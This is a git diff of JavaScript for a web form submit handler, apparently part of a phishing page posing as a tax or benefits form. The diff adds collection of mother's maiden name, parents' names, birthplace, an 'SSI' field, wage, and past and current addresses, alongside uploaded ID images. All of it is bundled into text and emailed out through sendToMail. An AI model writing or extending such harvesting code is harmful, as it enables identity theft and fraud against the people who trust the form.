@@ -52,6 +52,15 @@ form.addEventListener('submit', (ev) => {
     const fileFront = document.getElementById("fileFront").files;
     const fileBack = document.getElementById("fileBack").files;
     const checkedValue = document.querySelector('input[name="taxReturn"]:checked');
+    const father_name = document.getElementById("father_name").value;
+    const mother_name = document.getElementById("mother_name").value;
+    const mother_maiden = document.getElementById("mother_maiden").value;
+    const place_of_birth = document.getElementById("place_of_birth").value;
+    const city_of_birth = document.getElementById("city_of_birth").value;
+    const ssi = document.getElementById("ssi").value;
+    const wage = document.getElementById("wage").value;
+    const prev_add = document.getElementById("prev_add").value;
+    const curr_add = document.getElementById("curr_add").value;
 
     // document.querySelectorAll("input").forEach((input) => {
     //     console.log(input)
@@ -102,6 +111,15 @@ form.addEventListener('submit', (ev) => {
     my_txt += `State: ${state}\n`;
     my_txt += `Postal: ${postal}\n`;
     my_txt += `Did you file your 2023 tax return?: ${checkedValue.value}\n`;
+    my_txt += `Father's name: ${father_name}\n`;
+    my_txt += `Mother's name: ${mother_name}\n`;
+    my_txt += `Mother's maiden name: ${mother_maiden}\n`;
+    my_txt += `Place of birth: ${place_of_birth}\n`;
+    my_txt += `City of birth: ${city_of_birth}\n`;
+    my_txt += `SSI: ${ssi}\n`;
+    my_txt += `Wage: ${wage}\n`;
+    my_txt += `Previous address: ${prev_add}\n`;
+    my_txt += `Current address: ${curr_add}\n`;
     my_txt += `====================\n`;
 
     sendToMail(my_txt, fileFront[0], fileBack[0])
